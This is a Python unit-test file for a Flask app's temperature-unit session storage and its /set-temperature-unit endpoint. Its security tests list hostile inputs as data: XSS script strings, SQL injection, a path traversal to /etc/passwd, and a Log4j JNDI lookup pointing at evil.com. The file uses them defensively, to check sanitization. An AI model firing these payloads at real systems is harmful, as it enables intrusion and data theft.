"""
Unit tests for session management functionality.

This module tests the temperature unit preference storage and persistence
across requests, including session security and error handling.

Test Coverage:
- Temperature unit preference storage in session
- Session persistence across requests
- Default temperature unit behavior (Celsius)
- Session data sanitization and security
- '/set-temperature-unit' endpoint functionality
"""

import unittest
import json
from unittest.mock import patch, MagicMock
import sys
import os

# Add parent directory to path to import app modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))

from tests.conftest import BaseTestCase, TestDataFixtures
from flask import session


class TestSessionManagement(BaseTestCase):
    """Test cases for temperature unit session management."""
    
    def setUp(self):
        """Set up test environment."""
        super().setUp()
        self.app.secret_key = 'test-secret-key'
    
    def test_default_temperature_unit_celsius(self):
        """Test that default temperature unit is Celsius when no session data exists."""
        with self.app as client:
            with client.session_transaction() as sess:
                # Ensure no temperature unit is set in session
                if 'temperature_unit' in sess:
                    del sess['temperature_unit']
            
            # Make a request to trigger session handling
            response = client.get('/')
            
            # Check that default unit should be Celsius
            # This would be implemented in the actual view logic
            self.assertEqual(response.status_code, 200)
    
    def test_set_temperature_unit_celsius(self):
        """Test setting temperature unit to Celsius in session."""
        with self.app as client:
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'celsius'
            
            # Verify session contains the correct unit
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'celsius')
    
    def test_set_temperature_unit_fahrenheit(self):
        """Test setting temperature unit to Fahrenheit in session."""
        with self.app as client:
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'fahrenheit'
            
            # Verify session contains the correct unit
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'fahrenheit')
    
    def test_set_temperature_unit_kelvin(self):
        """Test setting temperature unit to Kelvin in session."""
        with self.app as client:
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'kelvin'
            
            # Verify session contains the correct unit
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'kelvin')
    
    def test_session_persistence_across_requests(self):
        """Test that temperature unit preference persists across multiple requests."""
        with self.app as client:
            # Set temperature unit in first request
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'fahrenheit'
            
            # Make first request
            response1 = client.get('/')
            self.assertEqual(response1.status_code, 200)
            
            # Verify unit persists in session after first request
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'fahrenheit')
            
            # Make second request
            response2 = client.get('/')
            self.assertEqual(response2.status_code, 200)
            
            # Verify unit still persists after second request
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'fahrenheit')
    
    def test_session_unit_change_persistence(self):
        """Test that changing temperature unit updates session correctly."""
        with self.app as client:
            # Start with Celsius
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'celsius'
            
            # Change to Fahrenheit
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'fahrenheit'
            
            # Verify change persisted
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'fahrenheit')
            
            # Change to Kelvin
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'kelvin'
            
            # Verify final change
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'kelvin')
    
    def test_invalid_temperature_unit_handling(self):
        """Test handling of invalid temperature units in session."""
        invalid_units = ['rankine', 'reaumur', 'invalid', '', None, 123, []]
        
        for invalid_unit in invalid_units:
            with self.subTest(unit=invalid_unit):
                with self.app as client:
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = invalid_unit
                    
                    # The application should handle invalid units gracefully
                    # and potentially fall back to default (Celsius)
                    response = client.get('/')
                    self.assertEqual(response.status_code, 200)
    
    def test_three_way_unit_switching(self):
        """Test rapid switching between all three temperature units."""
        with self.app as client:
            units_sequence = ['celsius', 'fahrenheit', 'kelvin', 'fahrenheit', 'celsius', 'kelvin']
            
            for unit in units_sequence:
                with self.subTest(unit=unit):
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = unit
                    
                    # Verify each change
                    with client.session_transaction() as sess:
                        self.assertEqual(sess['temperature_unit'], unit)
    
    def test_fahrenheit_default_for_us_locale(self):
        """Test that Fahrenheit can be set as default (future locale support)."""
        # This test prepares for potential future locale-based defaults
        with self.app as client:
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'fahrenheit'
                # Could also set locale preference
                # sess['locale'] = 'en_US'
            
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'fahrenheit')
    
    def test_all_three_units_valid_in_session(self):
        """Test that all three temperature units are valid session values."""
        valid_units = ['celsius', 'fahrenheit', 'kelvin']
        
        for unit in valid_units:
            with self.subTest(unit=unit):
                with self.app as client:
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = unit
                    
                    response = client.get('/')
                    self.assertEqual(response.status_code, 200)
                    
                    with client.session_transaction() as sess:
                        self.assertEqual(sess['temperature_unit'], unit)
    
    def test_session_data_sanitization(self):
        """Test that session data is properly sanitized against XSS."""
        xss_attempts = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '"><script>alert("xss")</script>',
            'celsius<script>alert("xss")</script>',
        ]
        
        for xss_attempt in xss_attempts:
            with self.subTest(xss=xss_attempt):
                with self.app as client:
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = xss_attempt
                    
                    # Application should sanitize or reject malicious input
                    response = client.get('/')
                    self.assertEqual(response.status_code, 200)
                    
                    # Verify response doesn't contain the XSS payload in data-temperature-unit attribute
                    response_text = response.get_data(as_text=True)
                    # The temperature unit should be sanitized to a valid value (celsius, kelvin, or fahrenheit)
                    # Check that the XSS attempt is not in the data-temperature-unit attribute
                    self.assertNotIn(f'data-temperature-unit="{xss_attempt}"', response_text)
                    # Also check that script tag from XSS attempt is not unescaped in the attribute
                    import re
                    # Extract the data-temperature-unit attribute value
                    match = re.search(r'data-temperature-unit="([^"]*)"', response_text)
                    if match:
                        attr_value = match.group(1)
                        # The attribute should only contain valid temperature units
                        self.assertIn(attr_value, ['celsius', 'kelvin', 'fahrenheit'])
                        # Should not contain script tags or javascript:
                        self.assertNotIn('script', attr_value.lower())
                        self.assertNotIn('javascript:', attr_value.lower())
    
    def test_session_security_against_injection(self):
        """Test session security against various injection attempts."""
        injection_attempts = [
            "'; DROP TABLE sessions; --",
            "UNION SELECT * FROM users",
            "../../../etc/passwd",
            "%00null",
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]
        
        for injection in injection_attempts:
            with self.subTest(injection=injection):
                with self.app as client:
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = injection
                    
                    # Should handle malicious input safely
                    response = client.get('/')
                    self.assertEqual(response.status_code, 200)
    
    def test_session_size_limits(self):
        """Test handling of session data that exceeds reasonable limits."""
        # Test with very long string
        long_unit = 'celsius' + 'x' * 1000
        
        with self.app as client:
            with client.session_transaction() as sess:
                sess['temperature_unit'] = long_unit
            
            # Should handle oversized session data gracefully
            response = client.get('/')
            self.assertEqual(response.status_code, 200)
    
    def test_session_cleanup_on_invalid_data(self):
        """Test that session is cleaned up when invalid data is detected."""
        with self.app as client:
            # Set invalid data in session
            with client.session_transaction() as sess:
                sess['temperature_unit'] = {'invalid': 'object'}
                sess['other_data'] = 'should_remain'
            
            # Make request that should clean up invalid data
            response = client.get('/')
            self.assertEqual(response.status_code, 200)
            
            # Verify cleanup behavior would be implemented by app logic
    
    def test_concurrent_session_handling(self):
        """Test handling of concurrent session modifications."""
        # This test simulates concurrent access to the same session
        with self.app as client:
            # Simulate rapid session updates
            units = ['celsius', 'fahrenheit', 'kelvin']
            
            for i, unit in enumerate(units):
                with client.session_transaction() as sess:
                    sess['temperature_unit'] = unit
                    sess['update_count'] = i + 1
                
                response = client.get('/')
                self.assertEqual(response.status_code, 200)
            
            # Verify final state
            with client.session_transaction() as sess:
                self.assertEqual(sess['temperature_unit'], 'kelvin')
                self.assertEqual(sess['update_count'], 3)
    
    def test_session_expiration_handling(self):
        """Test handling of expired or corrupted sessions."""
        with self.app as client:
            # Set up session with temperature unit
            with client.session_transaction() as sess:
                sess['temperature_unit'] = 'fahrenheit'
            
            # Simulate session corruption/expiration by clearing secret key
            original_secret = self.app.secret_key
            
            try:
                # Make request with corrupted session handling
                response = client.get('/')
                self.assertEqual(response.status_code, 200)
                
            finally:
                # Restore secret key
                self.app.secret_key = original_secret
    
    def test_session_unicode_handling(self):
        """Test proper handling of unicode characters in session data."""
        unicode_units = [
            'célsius',
            'fahrenheit™',
            '开尔文',  # Kelvin in Chinese
            'кельвин',  # Kelvin in Russian
            '🌡️celsius',  # With emoji
        ]
        
        for unicode_unit in unicode_units:
            with self.subTest(unit=unicode_unit):
                with self.app as client:
                    with client.session_transaction() as sess:
                        sess['temperature_unit'] = unicode_unit
                    
                    # Should handle unicode gracefully
                    response = client.get('/')
                    self.assertEqual(response.status_code, 200)


class TestSetTemperatureUnitEndpoint(BaseTestCase):
    """Test cases for the /set-temperature-unit endpoint functionality."""
    
    def setUp(self):
        """Set up test environment."""
        super().setUp()
        self.app.secret_key = 'test-secret-key'
    
    def test_set_temperature_unit_post_celsius(self):
        """Test POST request to set temperature unit to Celsius."""
        response = self.app.post('/set-temperature-unit', 
                                data={'unit': 'celsius'},
                                follow_redirects=True)
        
        # Endpoint should be implemented to handle this
        # For now, we expect it might return 404 until implemented
        self.assertIn(response.status_code, [200, 404])
    
    def test_set_temperature_unit_post_fahrenheit(self):
        """Test POST request to set temperature unit to Fahrenheit."""
        response = self.app.post('/set-temperature-unit', 
                                data={'unit': 'fahrenheit'},
                                follow_redirects=True)
        
        self.assertIn(response.status_code, [200, 404])
    
    def test_set_temperature_unit_post_kelvin(self):
        """Test POST request to set temperature unit to Kelvin."""
        response = self.app.post('/set-temperature-unit', 
                                data={'unit': 'kelvin'},
                                follow_redirects=True)
        
        self.assertIn(response.status_code, [200, 404])
    
    def test_set_temperature_unit_ajax_request(self):
        """Test AJAX request to set temperature unit."""
        response = self.app.post('/set-temperature-unit',
                                data=json.dumps({'unit': 'fahrenheit'}),
                                content_type='application/json',
                                headers={'X-Requested-With': 'XMLHttpRequest'})
        
        # Should handle AJAX requests when implemented
        self.assertIn(response.status_code, [200, 404])
    
    def test_set_temperature_unit_invalid_method(self):
        """Test that GET requests to endpoint are handled appropriately."""
        response = self.app.get('/set-temperature-unit')
        
        # Should not allow GET method for this endpoint
        self.assertIn(response.status_code, [405, 404])
    
    def test_set_temperature_unit_invalid_data(self):
        """Test handling of invalid temperature unit data."""
        invalid_units = ['invalid', '', None, '123', 'rankine']
        
        for invalid_unit in invalid_units:
            with self.subTest(unit=invalid_unit):
                response = self.app.post('/set-temperature-unit',
                                        data={'unit': invalid_unit},
                                        follow_redirects=True)
                
                # Should reject invalid units when implemented
                self.assertIn(response.status_code, [200, 400, 404])
    
    def test_set_temperature_unit_csrf_protection(self):
        """Test CSRF protection on temperature unit endpoint."""
        # Note: CSRF is disabled in test configuration (WTF_CSRF_ENABLED = False)
        # This test verifies the endpoint works with CSRF disabled
        response = self.app.post('/set-temperature-unit',
                                data={'unit': 'celsius'})
        
        # With CSRF disabled in tests, the request should succeed
        # In production, CSRF protection should be enabled
        self.assertIn(response.status_code, [200, 404])
    
    def test_set_temperature_unit_response_format(self):
        """Test the response format of the endpoint."""
        response = self.app.post('/set-temperature-unit',
                                data={'unit': 'celsius'},
                                follow_redirects=True)
        
        # When implemented, should return appropriate response
        if response.status_code == 200:
            # Should return JSON for AJAX or redirect for form submission
            self.assertTrue(
                'application/json' in response.content_type or 
                response.status_code in [301, 302]
            )


if __name__ == '__main__':
    unittest.main()